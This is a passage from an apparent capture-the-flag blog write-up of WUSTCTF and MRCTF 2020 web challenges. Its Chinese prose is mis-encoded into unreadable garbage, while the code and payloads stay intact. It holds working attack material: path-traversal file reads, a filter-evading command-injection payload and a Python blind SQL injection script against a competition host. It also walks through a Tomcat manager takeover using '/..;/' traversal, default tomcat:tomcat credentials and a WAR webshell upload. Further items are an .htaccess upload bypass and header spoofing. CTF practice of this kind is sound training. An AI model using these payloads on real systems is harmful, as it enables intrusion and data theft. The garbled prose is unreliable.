Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:106:107:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">tomajp:x:1000:1000::/home/tomajp:/bin/bash</span><br></pre></td></tr></table></figure><p>æœ‰æ„æ€çš„æ˜¯,æˆ‘ä»¬é¢˜ç›®èµ·çš„tomajpç”¨æˆ·çš„å®¶ç›®å½•æ˜¯ bin/bash.è¿™ç‚¹è®©æˆ‘æƒ³èµ·äº†ä¹‹å‰åšç½‘é¼æ¯Commentè¿™é“é¢˜çš„ä¸€ä¸ªæ”¶è·ï¼š<br>äºŒæ¬¡æ³¨å…¥,æ•°æ®åº“å´æ²¡æœ‰flag,é€šè¿‡è¯»å–.bash_historyå‘ç°äº†å…¶ä»–æ–‡ä»¶å¤¹ä¸­æœªåˆ é™¤çš„flagä»è€Œè¯»å–ã€‚<br>é‚£ä¹ˆæœ¬é¢˜å°è¯•è¯»å–<code>/home/tomajp/.bash_history</code><br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å‘ç°æœ‰è¹Šè··ï¼Œæ‹–åˆ°ä¸‹é¢æœ‰å‘ç°<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ ¹æ®è¿™é‡Œè®°å½•çš„æ“ä½œå¯ä»¥çœ‹åˆ°ï¼Œflagåº”è¯¥æ˜¯åœ¨æ ¹ç›®å½•çš„flaaaagæ–‡ä»¶å¤¹ä¸‹çš„what_you_want<br>ç›´æ¥è¯»å–å³å¯<br><code>/download?file=../../../../../../../../../flaaaag/what_you_want</code><br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é—®äº†ä¸‹å®˜æ–¹,çš„ç¡®æ˜¯ä¸ªæ¯”è¾ƒç®€å•çš„éé¢„æœŸ,é¢„æœŸè§£æ˜¯ä¸Šä¼ jspè¿›è¡ŒRCE.ä½†æ˜¯æˆ‘ä¸€ç›´æ²¡å¼„æ˜ç™½tomcaté‡Œä¸Šä¼ ç›®å½•è¦æ€ä¹ˆè®¿é—®ï¼Œè¿™ä¸ªå¯èƒ½æ˜¯åƒäº†ä¸ç†Ÿæ‚‰javaweb<br>çš„é”…ã€‚ä¸è¯´äº†ï¼Œä¹‹å‰è¯´å¥½è¦å­¦javawebä¹Ÿå¾—æä¸Šæ—¥ç¨‹äº†ã€‚<br>ps:èµ›åäº†è§£åˆ°æ˜¯ghostcatæ‰“ã€‚è¿™ä¸ªå°±å¾ˆæœ‰è¶£äº†ï¼Œå› ä¸ºåŒæœŸçš„å¦ä¸€ä¸ªå›½é™…èµ›æœ‰é¢˜ä¹Ÿæ˜¯è¿™ä¸ªå¹½çµçŒ«ã€‚æ‰¾æ—¶é—´ç­‰buuä¸Šé¶æœºäº†å¤ç°ä¸‹è¿™ä¸ªæ´ã€‚<br>ä¸ç”¨ç­‰äº†ï¼Œç›´æ¥çœ‹æˆ‘ä¸‹ä¸€ç¯‡æ–‡ç« å³å¯ã€‚åšä¸€ä¸ªè„šæœ¬å°å­ï¼Œghostcatåˆ©ç”¨è¿˜æ˜¯ä¸éš¾çš„ã€‚</p><h2 id="æœ´å®æ— å"><a href="#æœ´å®æ— å" class="headerlink" title="æœ´å®æ— å"></a>æœ´å®æ— å</h2><p>å…ˆæ”¾ä¸€ä¸ªæ²¡æ‹¿åˆ°ä¸€è¡€çš„åŸå› <br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ‰‹æ…¢ä¸€æ­¥åŠ ä¸Šå‡ºé¢˜äººæƒé™æ²¡æ§å¥½,ç›´æ¥flagè¢«åˆ äº†ã€‚å¯¼è‡´æˆ‘å¤šèŠ±äº†åŠä¸ªå°æ—¶,æ‰¾å‡ºé¢˜äººæ²Ÿé€šåå¥½äº†ã€‚ä¸è¿‡è¯´åˆ°åº•æ…¢ä¸€æ­¥flagè¢«åˆ è¿˜æ˜¯å› ä¸ºåªæœ‰äºŒè¡€çš„æ‰‹é€Ÿâ€¦â€¦</p><p>é¦–å…ˆæ˜¯ä¿¡æ¯æ”¶é›†ï¼Œè¿™é‡Œå¥‡æ€ªçš„ä¸€ç‚¹æ˜¯<code>/.git/</code>ç›®å½•ç›´æ¥æš´éœ²åœ¨å¤–äº†,ä½†æ˜¯ä»”ç»†è§‚å¯Ÿä¸‹å‘ç°åªæ˜¯ä¸ªlampçš„git.ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä¸ºäº†æ··æ·†è§†å¬æ•…æ„æ”¾çš„ã€‚åæ­£æˆ‘æ˜¯githackç”¨äº†å‡ æ¬¡æ‰å¯Ÿè§‰ä¸å¯¹åŠ²çš„ã€‚</p><p>ä¸ªäººä¿¡æ¯æ”¶é›†ä¸€ç›´æ˜¯æ‰‹æµ‹,æµ‹äº†å¥½å¤šæºç æ³„éœ²æ²¡ååº”åæ³¨æ„åˆ°index.phpç½‘é¡µçš„æ ‡é¢˜ä¸ºbotã€‚äºæ˜¯è€ƒè™‘robots.txtï¼Œå‘ç°äº†<code>fAke_f1agggg.php</code><br>è®¿é—®åå½“ç„¶æ²¡æœ‰çœŸflagï¼Œä½†æ˜¯headeré‡Œæœ‰<code>fl4g.php</code>ï¼Œå¾—åˆ°é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;"</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¿«åˆ°éæ´²äº†"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è€å¥—å¨ƒäº†ã€‚<br>ç¬¬ä¸€å±‚ä¸€ä¸ªintvalçš„é—®é¢˜ã€‚<br>è¿™é‡Œä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè¿›åˆ¶çš„æŠ€å·§ï¼Œæ¯”å¦‚2020çš„16è¿›åˆ¶7e4<br>intvalä¼šå°†å­—ç¬¦ä¸²7e4è®¤ä½œ7,è€Œintval(â€œ7e4â€+1)åˆ™è¢«ç±»å‹è½¬æ¢ï¼Œå˜ä¸º70001</p><p>ç¬¬äºŒå±‚å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜<br><code>$md5==md5($md5)</code><br>ä½†æ˜¯åŸæ¥æ ¡èµ›æ€»ç»“æ—¶å°±å¼ºè°ƒè¿‡ï¼Œç½‘ä¸Šä¸€ç›´ä»¥æ¥çš„è¯´æ³•å¾ˆä¸å‡†ç¡®ã€‚å¹¶éæ˜¯0eå¼€å¤´æ‰ä¼šè¢«åˆ¤ä½œ0.è€Œæ˜¯å› ä¸º0eå¼€å¤´ä¸”çº¯æ•°å­—ç„¶åæ‰èƒ½è¢«è½¬ä¸º0<br><a href="https://www.jianshu.com/p/52f04f85824e" target="_blank" rel="noopener">https://www.jianshu.com/p/52f04f85824e</a><br>æ•…æˆ‘ä»¬éœ€è¦0eå¼€å¤´çº¯æ•°å­—çš„æ•°ï¼Œä½¿å¾—å…¶MD5å€¼0eå¼€å¤´ä¸”çº¯æ•°å­—ã€‚<br>å› æ­¤è¿™ä¸ªä¸€å®šæ˜¯è¦è„šæœ¬è·‘çš„ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©æ”¾å¼ƒhhhã€‚æ‰¾é˜Ÿå‹è¦äº†ä»¥å‰è®²è¿‡è¿™ä¸ªtrickçš„æ–‡ç« ï¼Œå¾—åˆ°äº†è¿™ä¸ªç¥å¥‡æ•°å­—0e215962017</p><p>ç¬¬ä¸‰å±‚åŸºç¡€è‡³æã€‚<code>ca\t</code>å¯ä»¥ç»•è¿‡å…³é”®å­—ï¼Œ<code>${IFS}</code>æ›¿ä»£ç©ºæ ¼ï¼Œè¯»flagå¯ä»¥ç›´æ¥ç”¨<code>fll*</code>ï¼Œæˆ–è€…ç›´æ¥cat <code>cat `ls`</code> å³å¯ã€‚<br>ä¸»è¦è¿˜æ˜¯è¢«äººæ…å±å¯¼è‡´å¤šè¯•äº†å¥½ä¹…,è¿˜é¡ºä¾¿æ‰“ç®—å¼¹shellã€‚ç»“æœè¯•äº†5ç§æ–¹æ³•éƒ½æ²¡æˆ,çœŸçš„æ°”äºº<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;7e4&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;ca\t$&#123;IFS&#125;&#96;ls&#96;</span><br></pre></td></tr></table></figure><h2 id="é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="é¢œå€¼æˆç»©æŸ¥è¯¢"></a>é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>è£¸çš„æ•°å€¼å¸ƒå°”ç›²æ³¨ï¼Œç›´æ¥ä¸Šifåˆ†æµå°±å®Œäº‹ã€‚<br>å¥½åƒè¿‡æ»¤äº†ç©ºæ ¼ï¼Œé‚£å°±æ‹¬å·å¤šå¥—ä¸€ä¸‹ã€‚<br>å› ä¸ºæ‰“é”™äº†å‚æ•°<code>stunum</code>ï¼Œå¯¼è‡´åªæ‹¿åˆ°ä¸‰è¡€ã€‚æ°”æ­»äº†â€¦ä»¥åä¸€å®šç›´æ¥å¤åˆ¶ç²˜è´´urlã€‚åƒå¤§äºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://101.200.53.102:10114/index.php?stunum='</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&#123;&#125;-"</span>:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(group_concat(value))from(flag)),"</span>+str(i)+<span class="string">",1))="</span> + str(ord(str1)) + <span class="string">",1,2)"</span></span><br><span class="line">        payload = urllib.parse.quote(payload)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'admin'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=str1</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><del>æœ‰é“1è§£é¢˜è²Œä¼¼å¾ˆé¡¶å°±æ²¡æœ‰çœ‹ã€‚</del></p><h2 id="Train-Yourself-To-Be-Godly"><a href="#Train-Yourself-To-Be-Godly" class="headerlink" title="Train Yourself To Be Godly"></a>Train Yourself To Be Godly</h2><p>åˆ°buuä¸Šå¤ç°äº†ã€‚ä»”ç»†åšä¼šå‘ç°è¿˜æ˜¯ç»†èŠ‚ä¸Šé—®é¢˜æ¯”è¾ƒå¤šã€‚<br>é¦–å…ˆæ˜¯åˆ†æã€‚å› ä¸ºé¢˜ç›®æ˜¾ç¤ºçš„é¡µé¢æ˜¯tomcaté»˜è®¤çš„<code>/examples</code>è·¯ç”±ã€‚é‚£ä¹ˆè¯´æ˜æ˜¯ç”¨examplesåšçš„æ ¹ç›®å½•<br><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a><br>ç„¶åæ˜¯è¿™ä¸ªæ–‡æ¡£ã€‚<br>å¯ä»¥æ„é€ è·¯å¾„ç©¿è¶Šï¼Œæ¥åˆ°å…¶ä»–è·¯å¾„ä¸‹ã€‚æ¯”å¦‚æ­¤å¤„ä¸ºäº†getshell,è¿›å…¥<code>/manager</code>æ„é€ <code>/..;/manager</code><br>ä¹‹åä¸€ä¸ªtomcat:tomcatçš„å¼±å£ä»¤ã€‚<br>å…·ä½“getshellæµç¨‹å¯ä»¥å‚è€ƒvulhubä¸Štomcat/tomcat8çš„æ¼æ´Tomcat7+ å¼±å£ä»¤ &amp;&amp; åå°getshellæ¼æ´ã€‚[<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8]" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8]</a><br>(<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8)æˆ‘ä¹Ÿç®€å•å¤ç°äº†ä¸‹ï¼Œå¯ä»¥å»æˆ‘çš„vulhubå¤ç°æ–‡ç« é‚£çœ‹ã€‚" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8)æˆ‘ä¹Ÿç®€å•å¤ç°äº†ä¸‹ï¼Œå¯ä»¥å»æˆ‘çš„vulhubå¤ç°æ–‡ç« é‚£çœ‹ã€‚</a><br>å…ˆç»™å‡ºwebshell.jspä¸webshell.warçš„ç”Ÿæˆæ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                 </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>å¸¦å›æ˜¾ä¸å¯†ç çš„jspï¼Œæ¯”è¾ƒå¥½ç”¨ã€‚<br>ç„¶åå‘½ä»¤è¡Œå¯ä»¥ç”Ÿæˆwar<br><code>jar cvf webshell.war webshell.jsp</code><br>è²Œä¼¼ç›´æ¥å‹ç¼©jspæˆzipç„¶åæ”¹åç¼€ä¸ºwarä¹Ÿå¯ä»¥ã€‚<br>è¿›å…¥åè‡ªç„¶æ˜¯ä¸Šä¼ waråŒ…äº†ã€‚ä½†æ˜¯å¾ˆå¿«å‘ç°ç‚¹å‡»ä¸Šä¼ åè¿”å›404ã€‚è€Œå®ƒçš„è·¯å¾„ç»™çš„æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;examples&#x2F;..;&#x2F;manager&#x2F;html&#x2F;upload?org.apache.catalina.filters.CSRF_NONCE&#x3D;A226F07F06C2C983EE2911A5963BFA84</span><br></pre></td></tr></table></figure><p>çœ‹æ¥æ˜¯åˆä»æ ¹ç›®å½•å¼€å§‹åŠ è½½è·¯å¾„äº†ï¼Œè¿™ä¸ªç”¨åŒæ ·çš„æ–¹æ³•ï¼Œå°†è·¯å¾„æ”¹æˆ<br><code>/..;/manager/html/upload......</code>å³å¯<br>ä¸è¿‡å¾ˆå¿«ä¼šå‘ç°401ã€‚æœªæˆæƒè®¿é—®ã€‚å¦‚æœç†Ÿæ‚‰tomcatçš„å¾ˆå¿«èƒ½ååº”è¿‡æ¥æ˜¯å°‘äº†headeré‡Œçš„è®¤è¯ï¼Œå½“ç„¶åœ¨æˆåŠŸè®¿é—®åå°æ—¶æŠ“åŒ…ä¹Ÿèƒ½çœ‹åˆ°è‡ªå·±çš„headerä¸­æœ‰è®¤è¯å¤´ã€‚<br><code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code><br>åé¢å°±æ˜¯tomcat:tomcatçš„base64ç¼–ç ã€‚è¿™é‡Œæ˜¾ç„¶å› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡æ„é€ è·¯å¾„ç©¿è¶Šçš„é—®é¢˜ï¼Œæ²¡æœ‰åœ¨uploadæ—¶è‡ªåŠ¨å¸¦ä¸Šã€‚<br>é‚£ä¹ˆç»§ç»­ä¸Šä¼ ï¼Œå‘ç°403.åªèƒ½æ˜¯cookieçš„é—®é¢˜äº†ã€‚å›å¤´å»çœ‹è®¿é—®<code>/..;/manager/html</code>æ—¶å°±å­˜åœ¨set-cookieçš„è¿”å›ã€‚é‚£ä¹ˆåªèƒ½æ˜¯ç¼ºcookieäº†ã€‚<br>å…·ä½“åšæ³•ï¼šé‡æ–°è®¿é—®ä¸€é<code>/..;/manager/html</code>ä»è¿”å›å¤´å–ä¸€ä¸ªcookie.ç„¶åä¸Šä¼ æ—¶æŠ“åŒ…æ‹¦æˆªï¼ŒæŠŠè®¤è¯è·Ÿcookieä»¥åŠè®¿é—®åœ°å€å…¨éƒ¨æ”¹å¥½ï¼Œç›´åˆ°200ä¸ºæ­¢ã€‚<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ç„¶åå°±å¯ä»¥è®¿é—®webshellè¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚è¿™é‡Œflagæ¯”èµ›æ˜¯åœ¨æ ¹ç›®å½•çš„æ–‡ç« ä¸­ï¼Œbuuæ˜¯åœ¨æ ¹ç›®å½•.<br><code>/..;/webshell/exp.jsp?pwd=023&amp;i=cat%20/flagggg</code></p><h1 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a>MRCTF</h1><p>å¤©ç’‡çš„æ¯”èµ›ç›¸å¯¹WUSTå°±éš¾ä¸€ç‚¹ï¼Œç„¶è€Œè¿˜æ˜¯ä¸€å †å¥—å¨ƒã€‚å¿ƒé‡Œè‹¦ã€‚å¥—å¨ƒé¢˜å¤šçœŸçš„æ˜¯CTFæ¯”èµ›æ€ªç°çŠ¶äº†,è„±ç¦»äº†CTFçš„æœ¬è´¨â€¦</p><h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><p>è€å¥—å¨ƒäº†ã€‚æ–¹æ³•éƒ½è€å¥—äº†ã€‚<br>ç¬¬ä¸€æ­¥ä¸€ä¸ªMD5ç¢°æ’ï¼Œç½‘ä¸Šä¸€å †ç°æˆçš„ã€‚<br>ç¬¬äºŒæ­¥ä¸€ä¸ªisnumeric()ï¼Œåªéœ€è¦åœ¨æ•°å­—åéšä¾¿åŠ ä¸ªç¬¦å·å°±å¯ä»¥ç»•è¿‡</p><h2 id="ä½ ä¼ ä½ ğŸå‘¢"><a href="#ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="ä½ ä¼ ä½ ğŸå‘¢"></a>ä½ ä¼ ä½ ğŸå‘¢</h2><p>æ–‡ä»¶ä¸Šä¼ åŸºæœ¬å¥—è·¯ï¼Œè¯•äº†ä¸‹å‘ç°phpå¯è§£æçš„å‡ ä¸ªåç¼€éƒ½æ²¡äº†ã€‚é‚£è¯•è¯•<code>.htaccess</code>å‘ç°å¯ä»¥ã€‚é‚£å°±æ²¡äº‹äº†ï¼Œç»•æ–‡ä»¶æ£€æŸ¥ä¸Šä¼ jpgå›¾ç‰‡é©¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addtype application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>æˆ‘æ‰¿è®¤è¿™é¢˜æ˜¯æˆ‘è‡ªå·±èœäº†ã€‚<br>å¼€å§‹å‰ç«¯ä¸€ä¸ªéªŒè¯MD5ï¼Œä½†æ˜¯æ˜¯ä¸ªjsã€‚æˆ‘è¿˜è·‘å»æœjsçš„MD5å¼±ç±»å‹ï¼Œå‘ç°å¥½åƒå°±æ²¡æœ‰è¿™ä¸ªtrickå•Šâ€¦</p><p>åæ¥æ‰æ³¨æ„flag.phpè¯´ä»–è®°å½•äº†æ‰€æœ‰è´­ä¹°è€…ip<br>æ‰€ä»¥<code>X-Forwarded-For:127.0.0.1</code>è®¿é—®å³å¯</p><h2 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h2><p>å…ˆæ˜¯è¦ç»•ç¬¬ä¸€å±‚ï¼Œä½†æ˜¯æ€ä¹ˆçœ‹ç€å°±åƒæˆ‘ä»¬nctfçš„é¢˜å‘¢ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>b.u.p.t</code>æ›¿ä»£ï¼Œä»¥åŠåœ¨23333ååŠ ä¸Š%0aç»•è¿‡preg_match()</p><p>ç¬¬äºŒå±‚<br>é¦–å…ˆä¸€å †jsfuckï¼Œæ‰”Chromeæ§åˆ¶å°å¾—åˆ°ä¸€ä¸ªæç¤ºpost Merak,ä¼ ä¸ªå€¼å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 